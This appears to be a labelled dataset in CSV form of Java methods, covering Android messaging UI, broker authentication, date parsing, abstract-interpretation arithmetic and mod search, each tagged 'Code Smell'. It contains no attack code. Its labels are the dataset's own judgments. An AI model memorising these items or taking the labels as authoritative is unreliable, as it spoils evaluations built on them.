text,label,text_label
"@Override public boolean identityValidBrokerInfo(ClientMaster.MasterCertificateInfo certificateInfo,ProcessResult result){
  if (!masterConfig.isNeedBrokerVisitAuth()) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  if (certificateInfo == null) {
    result.setSuccResult(new CertifiedInfo());
    return result.isSuccess();
  }
  ClientMaster.AuthenticateInfo authInfo=certificateInfo.getAuthInfo();
  if (authInfo == null) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: AuthenticateInfo is null!"");
    return result.isSuccess();
  }
  if (TStringUtils.isBlank(authInfo.getUserName())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: authInfo.userName is Blank!"");
    return result.isSuccess();
  }
  String inUserName=authInfo.getUserName().trim();
  if (TStringUtils.isBlank(authInfo.getSignature())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: authInfo.signature is Blank!"");
    return result.isSuccess();
  }
  String inSignature=authInfo.getSignature().trim();
  if (!inUserName.equals(masterConfig.getVisitName())) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: userName is not equal in authenticateToken!"");
    return result.isSuccess();
  }
  if (Math.abs(System.currentTimeMillis() - authInfo.getTimestamp()) > masterConfig.getAuthValidTimeStampPeriodMs()) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: timestamp out of effective period in authenticateToken!"");
    return result.isSuccess();
  }
  String signature=TStringUtils.getAuthSignature(inUserName,masterConfig.getVisitPassword(),authInfo.getTimestamp(),authInfo.getNonce());
  if (!inSignature.equals(signature)) {
    result.setFailResult(TErrCodeConstants.CERTIFICATE_FAILURE,""Illegal value: userName or password is not correct!"");
    return result.isSuccess();
  }
  result.setSuccResult(new CertifiedInfo());
  return result.isSuccess();
}
",1,Code Smell
"public static boolean processErrors(TLRPC.TL_error err,BaseFragment fragment,BulletinFactory factory){
  if (err == null || TextUtils.isEmpty(err.text)) {
    return true;
  }
  if (""INVITE_PEERS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_CHATS_IN_FOLDER,fragment.getCurrentAccount(),null).show();
  }
 else   if (""PEERS_LIST_EMPTY"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""FolderLinkNoChatsError"",R.string.FolderLinkNoChatsError)).show();
  }
 else   if (""USER_CHANNELS_TOO_MUCH"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""FolderLinkOtherAdminLimitError"",R.string.FolderLinkOtherAdminLimitError)).show();
  }
 else   if (""CHANNELS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_TO0_MANY_COMMUNITIES,fragment.getCurrentAccount(),null).show();
  }
 else   if (""INVITES_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_FOLDER_INVITES,fragment.getCurrentAccount(),null).show();
  }
 else   if (""CHATLISTS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_SHARED_FOLDERS,fragment.getCurrentAccount(),null).show();
  }
 else   if (""INVITE_SLUG_EXPIRED"".equals(err.text)) {
    factory.createErrorBulletin(LocaleController.getString(""NoFolderFound"",R.string.NoFolderFound)).show();
  }
 else   if (""FILTER_INCLUDE_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_CHATS_IN_FOLDER,fragment.getCurrentAccount(),null).show();
  }
 else   if (""DIALOG_FILTERS_TOO_MUCH"".equals(err.text)) {
    new LimitReachedBottomSheet(fragment,fragment.getContext(),LimitReachedBottomSheet.TYPE_FOLDERS,fragment.getCurrentAccount(),null).show();
  }
 else {
    factory.createErrorBulletin(LocaleController.getString(""UnknownError"",R.string.UnknownError)).show();
  }
  return true;
}",1,Code Smell
"private static void solveGridPlacement(@NonNull final DatabaseHelper helper,@NonNull final DbReader srcReader,@NonNull final DbReader destReader,final int screenId,final int trgX,final int trgY,@NonNull final List<DbEntry> sortedItemsToPlace,final boolean matchingScreenIdOnly){
  final GridOccupancy occupied=new GridOccupancy(trgX,trgY);
  final Point trg=new Point(trgX,trgY);
  final Point next=new Point(0,screenId == 0 && FeatureFlags.QSbOnFirstScreen(NeoApp.getInstance()) ? 1 : 0);
  List<DbEntry> existedEntries=destReader.mWorkspaceEntriesByScreenId.get(screenId);
  if (existedEntries != null) {
    for (    DbEntry entry : existedEntries) {
      occupied.markCells(entry,true);
    }
  }
  Iterator<DbEntry> iterator=sortedItemsToPlace.iterator();
  while (iterator.hasNext()) {
    final DbEntry entry=iterator.next();
    if (matchingScreenIdOnly && entry.screenId < screenId)     continue;
    if (matchingScreenIdOnly && entry.screenId > screenId)     break;
    if (entry.minSpanX > trgX || entry.minSpanY > trgY) {
      iterator.remove();
      continue;
    }
    if (findPlacementForEntry(entry,next,trg,occupied,screenId)) {
      insertEntryInDb(helper,entry,srcReader.mTableName,destReader.mTableName);
      iterator.remove();
    }
  }
}",1,Code Smell
"/** 
 * Returns a new visitor which runs the supplied visitor in a loop until no more changes are made, or a maximum of 3 cycles is reached. Convenient when a visitor is designed to recursively apply itself to a tree to achieve its desired result. Stops early if the visitor ceases to make changes to the tree before the maximum number of cycles is reached.
 */
public static TreeVisitor<?,ExecutionContext> repeatUntilStable(TreeVisitor<?,ExecutionContext> v){
  return repeatUntilStable(v,3);
}
/** 
 * Returns a new visitor which runs the supplied visitor in a loop until no more changes are made, or the maximum number of cycles is reached. Convenient when a visitor is designed to recursively apply itself to a tree to achieve its desired result. Stops early if the visitor ceases to make changes to the tree before the maximum number of cycles is reached.
 */
public static TreeVisitor<?,ExecutionContext> repeatUntilStable(TreeVisitor<?,ExecutionContext> v,int maxCycles){
  return new TreeVisitor<Tree,ExecutionContext>(){
    @Override public @Nullable Tree visit(    @Nullable Tree tree,    ExecutionContext ctx){
      if (tree instanceof SourceFile && !v.isAcceptable((SourceFile)tree,ctx)) {
        return tree;
      }
      if (tree != null && !(tree instanceof SourceFile) && getCursor().isRoot()) {
        throw new IllegalArgumentException(String.format(""Repeat visitor called on a non-source file tree without a cursor pointing to the root of the tree. "" + ""Passed tree type: `%s`. "" + ""This is likely a bug in the calling code. Use a `visit` method that accepts a cursor instead."",tree.getClass().getName()));
      }
      Tree previous=tree;
      Tree current=null;
      for (int i=0; i < maxCycles; i++) {
        current=v.visit(previous,ctx);
        if (current == previous) {
          break;
        }
        previous=current;
      }
      return current;
    }
    @Override public @Nullable Tree visit(    @Nullable Tree tree,    ExecutionContext ctx,    Cursor parent){
      if (tree instanceof SourceFile && !v.isAcceptable((SourceFile)tree,ctx)) {
        return tree;
      }
      Tree previous=tree;
      Tree current=null;
      for (int i=0; i < maxCycles; i++) {
        current=v.visit(previous,ctx,parent);
        if (current == previous) {
          break;
        }
        previous=current;
      }
      return current;
    }
  }
;
}",1,Code Smell
"/** 
 * Parses a date value from the stream.
 */
protected long parseDate() throws IOException {
  if (_utcCalendar == null)   _utcCalendar=Calendar.getInstance(TimeZone.getTimeZone(""UTC""));
  return parseDate(_utcCalendar);
}
/** 
 * Parses a date value from the stream.
 */
protected long parseDate(Calendar calendar) throws IOException {
  int ch=skipWhitespace();
  int year=0;
  for (int i=0; i < 4; i++) {
    if (ch >= '0' && ch <= '9')     year=10 * year + ch - '0';
 else     throw expectedChar(""year"",ch);
    ch=read();
  }
  int month=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     month=10 * month + ch - '0';
 else     throw expectedChar(""month"",ch);
    ch=read();
  }
  int day=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     day=10 * day + ch - '0';
 else     throw expectedChar(""day"",ch);
    ch=read();
  }
  if (ch != 'T')   throw expectedChar(""`T'"",ch);
  ch=read();
  int hour=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     hour=10 * hour + ch - '0';
 else     throw expectedChar(""hour"",ch);
    ch=read();
  }
  int minute=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     minute=10 * minute + ch - '0';
 else     throw expectedChar(""minute"",ch);
    ch=read();
  }
  int second=0;
  for (int i=0; i < 2; i++) {
    if (ch >= '0' && ch <= '9')     second=10 * second + ch - '0';
 else     throw expectedChar(""second"",ch);
    ch=read();
  }
  int ms=0;
  if (ch == '.') {
    ch=read();
    while (ch >= '0' && ch <= '9') {
      ms=10 * ms + ch - '0';
      ch=read();
    }
  }
  for (; ch > 0 && ch != '<'; ch=read()) {
  }
  _peek=ch;
  calendar.set(Calendar.YEAR,year);
  calendar.set(Calendar.MONTH,month - 1);
  calendar.set(Calendar.DAY_OF_MONTH,day);
  calendar.set(Calendar.HOUR_OF_DAY,hour);
  calendar.set(Calendar.MINUTE,minute);
  calendar.set(Calendar.SECOND,second);
  calendar.set(Calendar.MILLISECOND,ms);
  return calendar.getTime().getTime();
}",1,Code Smell
"protected boolean isPropertiesMatched(SchemaGuard schemaGuard,GuardEntity guardEntity){
  List<SchemaPropertyPattern> patterns=(schemaGuard.getPropertyPatterns() == null ? Collections.emptyList() : schemaGuard.getPropertyPatterns());
  List<SchemaProperty> properties=(guardEntity.getProperties() == null ? Collections.emptyList() : guardEntity.getProperties());
  if (patterns.isEmpty()) {
    if (schemaGuard.isEmptyPropertyPatternsForAll())     return true;
 else     return properties.isEmpty();
  }
  if (properties.isEmpty())   return false;
  String pmm=schemaGuard.getPropertiesMatchMode();
  if (StringUtil.isEmpty(pmm))   pmm=SchemaGuard.PROPERTIES_MATCH_MODE_ANY;
  if (SchemaGuard.PROPERTIES_MATCH_MODE_ANY.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (myMatches)       return true;
    }
    return false;
  }
 else   if (SchemaGuard.PROPERTIES_MATCH_MODE_ALL.equalsIgnoreCase(pmm)) {
    for (    SchemaPropertyPattern pattern : patterns) {
      String namePattern=(StringUtil.isEmpty(pattern.getNamePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getNamePattern());
      String valuePattern=(StringUtil.isEmpty(pattern.getValuePattern()) ? AsteriskPatternMatcher.ALL_PATTERN : pattern.getValuePattern());
      boolean myMatches=false;
      for (      SchemaProperty p : properties) {
        if (this.asteriskPatternMatcher.matches(namePattern,p.getName()) && this.asteriskPatternMatcher.matches(valuePattern,p.getValue())) {
          myMatches=true;
          break;
        }
      }
      if (!myMatches)       return false;
    }
    return true;
  }
 else {
    return false;
  }
}
",1,Code Smell
"private void showPopup(Runnable setupRunnable,View parent,int gravity,int x,int y,boolean blurAndBounce){
  if (popupWindow != null && popupWindow.isShowing()) {
    popupWindow.dismiss();
    return;
  }
  if (popupLayout == null) {
    popupRect=new android.graphics.Rect();
    popupLayout=new PopupWindowLayout(getContext());
    popupLayout.setAnimationEnabled(true);
    popupLayout.setOnTouchListener((v,event) -> {
      if (event.getActionMasked() == MotionEvent.ACTION_DOWN) {
        if (popupWindow != null && popupWindow.isShowing()) {
          v.getHitRect(popupRect);
          if (!popupRect.contains((int)event.getX(),(int)event.getY())) {
            popupWindow.dismiss();
          }
        }
      }
      return false;
    }
);
    popupLayout.setDispatchKeyEventListener(keyEvent -> {
      if (keyEvent.getKeyCode() == KeyEvent.KEYCODE_BACK && keyEvent.getRepeatCount() == 0 && popupWindow != null && popupWindow.isShowing()) {
        popupWindow.dismiss();
      }
    }
);
    popupLayout.setShownFromBottom(true);
  }
  popupLayout.enableBounce=blurAndBounce;
  popupLayout.removeInnerViews();
  setupRunnable.run();
  if (popupWindow == null) {
    popupWindow=new ActionBarPopupWindow(popupLayout,LayoutHelper.WRAP_CONTENT,LayoutHelper.WRAP_CONTENT);
    popupWindow.setAnimationEnabled(true);
    popupWindow.setAnimationStyle(R.style.PopupAnimation);
    popupWindow.setOutsideTouchable(true);
    popupWindow.setClippingEnabled(true);
    popupWindow.setInputMethodMode(ActionBarPopupWindow.INPUT_METHOD_NOT_NEEDED);
    popupWindow.setSoftInputMode(WindowManager.LayoutParams.SOFT_INPUT_STATE_UNSPECIFIED);
    popupWindow.getContentView().setFocusableInTouchMode(true);
    popupWindow.setOnDismissListener(() -> popupLayout.removeInnerViews());
  }
  popupLayout.measure(MeasureSpec.makeMeasureSpec(dp(1000),MeasureSpec.AT_MOST),MeasureSpec.makeMeasureSpec(dp(1000),MeasureSpec.AT_MOST));
  popupWindow.setFocusable(true);
  if ((gravity & Gravity.TOP) != 0) {
    x-=popupLayout.getMeasuredWidth() / 2;
    y-=popupLayout.getMeasuredHeight();
  }
  popupWindow.showAtLocation(parent,gravity,x,y);
  popupWindow.startAnimation(popupLayout);
  Drawable baseDrawable=getContext().getResources().getDrawable(R.drawable.popup_fixed_alert3).mutate();
  if (blurAndBounce) {
    popupLayout.setBackgroundDrawable(new BlurringShader.StoryBlurDrawer(blurManager,popupLayout,BlurringShader.StoryBlurDrawer.BLUR_TYPE_MENU_BACKGROUND).makeDrawable(x,y,baseDrawable,dpf2(8.3f)));
  }
 else {
    popupLayout.setBackgroundDrawable(baseDrawable);
    popupLayout.setBackgroundColor(-14145495);
  }
}",1,Code Smell
"@Override protected void drawPickerChart(Canvas canvas){
  int bottom=getMeasuredHeight() - PICKER_PADDING;
  int top=getMeasuredHeight() - pikerHeight - PICKER_PADDING;
  int nl=lines.size();
  if (chartData != null) {
    for (int k=0; k < nl; k++) {
      LineViewData line=lines.get(k);
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePath.reset();
      int n=chartData.xPercentage.length;
      int j=0;
      final long[] y=line.line.y;
      line.chartPath.reset();
      for (int i=0; i < n; i++) {
        if (y[i] < 0)         continue;
        float xPoint=chartData.xPercentage[i] * pickerWidth;
        float h=ANIMATE_PICKER_SIZES ? pickerMaxHeight : chartData.maxValue;
        float yPercentage=(float)y[i] * chartData.linesK[k] / h;
        float yPoint=(1f - yPercentage) * (bottom - top);
        if (USE_LINES) {
          if (j == 0) {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
 else {
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
            line.linesPathBottom[j++]=xPoint;
            line.linesPathBottom[j++]=yPoint;
          }
        }
 else {
          if (i == 0) {
            line.bottomLinePath.moveTo(xPoint,yPoint);
          }
 else {
            line.bottomLinePath.lineTo(xPoint,yPoint);
          }
        }
      }
      line.linesPathBottomSize=j;
      if (!line.enabled && line.alpha == 0)       continue;
      line.bottomLinePaint.setAlpha((int)(255 * line.alpha));
      if (USE_LINES)       canvas.drawLines(line.linesPathBottom,0,line.linesPathBottomSize,line.bottomLinePaint);
 else       canvas.drawPath(line.bottomLinePath,line.bottomLinePaint);
    }
  }
}",1,Code Smell
"public void deleteUserPhoto(TLRPC.InputPhoto photo){
  if (photo == null) {
    TLRPC.TL_photos_updateProfilePhoto req=new TLRPC.TL_photos_updateProfilePhoto();
    req.id=new TLRPC.TL_inputPhotoEmpty();
    TLRPC.User user=getUser(getUserConfig().getClientUserId());
    if (user == null) {
      user=getUserConfig().getCurrentUser();
    }
    if (user == null) {
      return;
    }
    if (user.photo != null) {
      getMessagesStorage().clearUserPhoto(user.id,user.photo.photo_id);
    }
    getNotificationCenter().postNotificationName(NotificationCenter.mainUserInfoChanged);
    getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_ALL);
    getConnectionsManager().sendRequest(req,(response,error) -> {
      if (error == null) {
        AndroidUtilities.runOnUIThread(() -> {
          TLRPC.TL_photos_photo photos_photo=(TLRPC.TL_photos_photo)response;
          TLRPC.User user1=getUser(getUserConfig().getClientUserId());
          if (user1 == null) {
            user1=getUserConfig().getCurrentUser();
            putUser(user1,false);
          }
 else {
            getUserConfig().setCurrentUser(user1);
          }
          if (user1 == null) {
            return;
          }
          ArrayList<TLRPC.User> users=new ArrayList<>();
          users.add(user1);
          getMessagesStorage().putUsersAndChats(users,null,false,true);
          if (photos_photo.photo instanceof TLRPC.TL_photo) {
            user1.photo=new TLRPC.TL_userProfilePhoto();
            user1.photo.has_video=!photos_photo.photo.video_sizes.isEmpty();
            user1.photo.photo_id=photos_photo.photo.id;
            user1.photo.photo_small=FileLoader.getClosestPhotoSizeWithSize(photos_photo.photo.sizes,150).location;
            user1.photo.photo_big=FileLoader.getClosestPhotoSizeWithSize(photos_photo.photo.sizes,800).location;
            user1.photo.dc_id=photos_photo.photo.dc_id;
          }
 else {
            user1.photo=new TLRPC.TL_userProfilePhotoEmpty();
          }
          TLRPC.UserFull userFull=getUserFull(getUserConfig().getClientUserId());
          userFull.profile_photo=photos_photo.photo;
          getMessagesStorage().updateUserInfo(userFull,false);
          getUserConfig().getCurrentUser().photo=user1.photo;
          putUser(user1,false);
          getNotificationCenter().postNotificationName(NotificationCenter.mainUserInfoChanged);
          getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_ALL);
          getNotificationCenter().postNotificationName(NotificationCenter.updateInterfaces,UPDATE_MASK_AVATAR);
          getUserConfig().saveConfig(true);
        }
);
      }
    }
);
  }
 else {
    TLRPC.TL_photos_deletePhotos req=new TLRPC.TL_photos_deletePhotos();
    req.id.add(photo);
    getConnectionsManager().sendRequest(req,(response,error) -> {
    }
);
  }
}",1,Code Smell
"public void convertToMegaGroup(Context context,long chatId,BaseFragment fragment,MessagesStorage.LongCallback convertRunnable){
  convertToMegaGroup(context,chatId,fragment,convertRunnable,null);
}
public void convertToMegaGroup(Context context,long chatId,BaseFragment fragment,MessagesStorage.LongCallback convertRunnable,Runnable errorRunnable){
  TLRPC.TL_messages_migrateChat req=new TLRPC.TL_messages_migrateChat();
  req.chat_id=chatId;
  AlertDialog progressDialog=context != null ? new AlertDialog(context,AlertDialog.ALERT_TYPE_SPINNER) : null;
  int reqId=getConnectionsManager().sendRequest(req,(response,error) -> {
    if (error == null) {
      if (context != null) {
        AndroidUtilities.runOnUIThread(() -> {
          if (!((Activity)context).isFinishing()) {
            try {
              progressDialog.dismiss();
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
          }
        }
);
      }
      TLRPC.Updates updates=(TLRPC.Updates)response;
      processUpdates((TLRPC.Updates)response,false);
      AndroidUtilities.runOnUIThread(() -> {
        if (convertRunnable != null) {
          TLRPC.Chat prevChat=null;
          for (int a=0; a < updates.chats.size(); a++) {
            TLRPC.Chat chat=updates.chats.get(a);
            if (chatId == chat.id) {
              prevChat=chat;
              break;
            }
          }
          if (prevChat != null && prevChat.migrated_to != null) {
            long newChatId=prevChat.migrated_to.channel_id;
            TLRPC.Chat newChat=null;
            for (int a=0; a < updates.chats.size(); a++) {
              TLRPC.Chat chat=updates.chats.get(a);
              if (newChatId == chat.id) {
                newChat=chat;
                break;
              }
            }
            if (newChat != null) {
              convertRunnable.run(newChatId);
            }
          }
        }
      }
);
    }
 else {
      if (errorRunnable != null) {
        errorRunnable.run();
      }
      AndroidUtilities.runOnUIThread(() -> {
        if (convertRunnable != null) {
          convertRunnable.run(0);
        }
        if (context != null) {
          if (!((Activity)context).isFinishing()) {
            try {
              progressDialog.dismiss();
            }
 catch (            Exception e) {
              FileLog.e(e);
            }
            AlertsCreator.processError(currentAccount,error,fragment,req,false);
          }
        }
      }
);
    }
  }
);
  if (progressDialog != null) {
    progressDialog.setOnCancelListener(dialog -> getConnectionsManager().cancelRequest(reqId,true));
    try {
      progressDialog.show();
    }
 catch (    Exception ignore) {
    }
  }
}",1,Code Smell
"@WorkerThread private void loadTrackers(){
  if (mAllClasses == null)   return;
  List<SignatureInfo> trackerInfoList=new ArrayList<>();
  String[] trackerNames=StaticDataset.getTrackerNames();
  String[] trackerSignatures=StaticDataset.getTrackerCodeSignatures();
  int[] signatureCount=new int[trackerSignatures.length];
  mTrackerClasses=new ArrayList<>();
  for (  String className : mAllClasses) {
    if (className.length() > 8 && className.contains(""."")) {
      for (int i=0; i < trackerSignatures.length; i++) {
        if (className.contains(trackerSignatures[i])) {
          mTrackerClasses.add(className);
          signatureCount[i]++;
          break;
        }
      }
    }
  }
  for (int i=0; i < trackerSignatures.length; i++) {
    if (signatureCount[i] == 0)     continue;
    SignatureInfo signatureInfo=new SignatureInfo(trackerSignatures[i],trackerNames[i]);
    signatureInfo.setCount(signatureCount[i]);
    trackerInfoList.add(signatureInfo);
  }
  mTrackerClassesLiveData.postValue(trackerInfoList);
}",1,Code Smell
"/** 
 * @hidden Concatenation operation that understands the endianess of the data. this KSet contains the most significant part, rhs is least significant part
 * @param rhs least significant part
 * @return KSet
 */
public KSet piece(KSet rhs){
  int resBits=bits + rhs.bits;
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(resBits,taintRes);
  if (isBot() || rhs.isBot()) {
    return res;
  }
  for (  AbsVal mostPart : kSet) {
    if (mostPart.region.isGlobal()) {
      for (      AbsVal leastPart : rhs.kSet) {
        if (leastPart.region.isGlobal()) {
          if (resBits <= 64) {
            long tmp=(mostPart.value << rhs.bits) | leastPart.value;
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),tmp));
          }
 else {
            BigInteger bigMostPart=mostPart.toBigInteger(bits,false);
            BigInteger bigLeastPart=leastPart.toBigInteger(rhs.bits,false);
            BigInteger bigTmp=bigMostPart.shiftLeft(rhs.bits).or(bigLeastPart);
            res.kSet=res.kSet.insert(new AbsVal(Global.getInstance(),bigTmp));
          }
        }
      }
    }
  }
  return res;
}",1,Code Smell
"private void updateVisibleRows(int mask){
  updateVisibleRows(mask,true);
}
private void updateVisibleRows(int mask,boolean animated){
  if ((dialogsListFrozen && (mask & MessagesController.UPDATE_MASK_REORDER) == 0) || isPaused) {
    return;
  }
  for (int c=0; c < 3; c++) {
    RecyclerListView list;
    ViewPage viewPage=null;
    if (c == 2) {
      list=searchViewPager != null ? searchViewPager.searchListView : null;
    }
 else     if (viewPages != null) {
      list=c < viewPages.length ? viewPages[c].listView : null;
      if (list != null && viewPages[c].getVisibility() != View.VISIBLE) {
        continue;
      }
      if (list != null) {
        viewPage=viewPages[c];
      }
    }
 else {
      continue;
    }
    if (list == null || list.getAdapter() == null) {
      continue;
    }
    if ((mask & MessagesController.UPDATE_MASK_NEW_MESSAGE) != 0 || mask == 0) {
      if (viewPage != null) {
        viewPage.updateList(false);
        continue;
      }
    }
    int count=list.getChildCount();
    for (int a=0; a < count; a++) {
      View child=list.getChildAt(a);
      if (child instanceof DialogCell) {
        if (list.getAdapter() != searchViewPager.dialogsSearchAdapter) {
          DialogCell cell=(DialogCell)child;
          if ((mask & MessagesController.UPDATE_MASK_REORDER) != 0) {
            cell.onReorderStateChanged(actionBar.isActionModeShowed(),true);
            if (dialogsListFrozen) {
              continue;
            }
          }
          if ((mask & MessagesController.UPDATE_MASK_CHECK) != 0) {
            cell.setChecked(false,(mask & MessagesController.UPDATE_MASK_CHAT) != 0);
          }
 else {
            if ((mask & MessagesController.UPDATE_MASK_SELECT_DIALOG) != 0) {
              if (viewPages[c].isDefaultDialogType() && AndroidUtilities.isTablet()) {
                cell.setDialogSelected(cell.getDialogId() == openedDialogId.dialogId);
              }
            }
 else {
              if (cell.update(mask,animated)) {
                viewPage.updateList(false);
                break;
              }
            }
            if (selectedDialogs != null) {
              cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
            }
          }
        }
      }
      if (child instanceof UserCell) {
        ((UserCell)child).update(mask);
      }
 else       if (child instanceof ProfileSearchCell) {
        ProfileSearchCell cell=(ProfileSearchCell)child;
        cell.update(mask);
        if (selectedDialogs != null) {
          cell.setChecked(selectedDialogs.contains(cell.getDialogId()),false);
        }
      }
      if (dialogsListFrozen) {
        continue;
      }
      if (child instanceof RecyclerListView) {
        RecyclerListView innerListView=(RecyclerListView)child;
        int count2=innerListView.getChildCount();
        for (int b=0; b < count2; b++) {
          View child2=innerListView.getChildAt(b);
          if (child2 instanceof HintDialogCell) {
            ((HintDialogCell)child2).update(mask);
          }
        }
      }
    }
  }
}",1,Code Smell
"/** 
 * @hidden
 */
public KSet int_and(KSet rhs){
  if (!isTop() && !rhs.isTop()) {
    assert this.bits == rhs.bits;
  }
  long taintRes=getBinaryTaintResult(rhs);
  if (isTop() || rhs.isTop()) {
    return getTop(taintRes);
  }
  KSet res=new KSet(bits,taintRes);
  for (  AbsVal op1 : kSet) {
    for (    AbsVal op2 : rhs.kSet) {
      RegionBase region=getRegionBinaryLogic(op1,op2);
      if (region != null) {
        if (res.kSet.size() == GlobalState.config.getK()) {
          return getTop(taintRes);
        }
        if (bits <= 64) {
          assert (op1.bigVal == null && op2.bigVal == null);
          res.kSet=res.kSet.insert(new AbsVal(region,(op1.value & op2.value) & getMask(bits)));
        }
 else {
          BigInteger bigOp1=op1.toBigInteger(bits,false);
          BigInteger bigOp2=op2.toBigInteger(bits,false);
          BigInteger tmp=bigOp1.and(bigOp2).and(getBigMask(bits));
          res.kSet=res.kSet.insert(new AbsVal(region,tmp));
        }
      }
    }
  }
  return res;
}",1,Code Smell
"@Override public SearchResult searchMod(SearchFilters searchFilters,SearchResult previousPageResult){
  ModrinthSearchResult modrinthSearchResult=(ModrinthSearchResult)previousPageResult;
  if (modrinthSearchResult != null && modrinthSearchResult.previousOffset >= modrinthSearchResult.totalResultCount) {
    ModrinthSearchResult emptyResult=new ModrinthSearchResult();
    emptyResult.results=new ModItem[0];
    emptyResult.totalResultCount=modrinthSearchResult.totalResultCount;
    emptyResult.previousOffset=modrinthSearchResult.previousOffset;
    return emptyResult;
  }
  HashMap<String,Object> params=new HashMap<>();
  StringBuilder facetString=new StringBuilder();
  facetString.append(""["");
  facetString.append(String.format(""[\""project_type:%s\""]"",searchFilters.isModpack ? ""modpack"" : ""mod""));
  if (searchFilters.mcVersion != null && !searchFilters.mcVersion.isEmpty())   facetString.append(String.format("",[\""versions:%s\""]"",searchFilters.mcVersion));
  facetString.append(""]"");
  params.put(""facets"",facetString.toString());
  params.put(""query"",searchFilters.name);
  params.put(""limit"",50);
  params.put(""index"",""relevance"");
  if (modrinthSearchResult != null)   params.put(""offset"",modrinthSearchResult.previousOffset);
  JsonObject response=mApiHandler.get(""search"",params,JsonObject.class);
  if (response == null)   return null;
  JsonArray responseHits=response.getAsJsonArray(""hits"");
  if (responseHits == null)   return null;
  ModItem[] items=new ModItem[responseHits.size()];
  for (int i=0; i < responseHits.size(); ++i) {
    JsonObject hit=responseHits.get(i).getAsJsonObject();
    items[i]=new ModItem(Constants.SOURCE_MODRINTH,hit.get(""project_type"").getAsString().equals(""modpack""),hit.get(""project_id"").getAsString(),hit.get(""title"").getAsString(),hit.get(""description"").getAsString(),hit.get(""icon_url"").getAsString());
  }
  if (modrinthSearchResult == null)   modrinthSearchResult=new ModrinthSearchResult();
  modrinthSearchResult.previousOffset+=responseHits.size();
  modrinthSearchResult.results=items;
  modrinthSearchResult.totalResultCount=response.get(""total_hits"").getAsInt();
  return modrinthSearchResult;
}",1,Code Smell
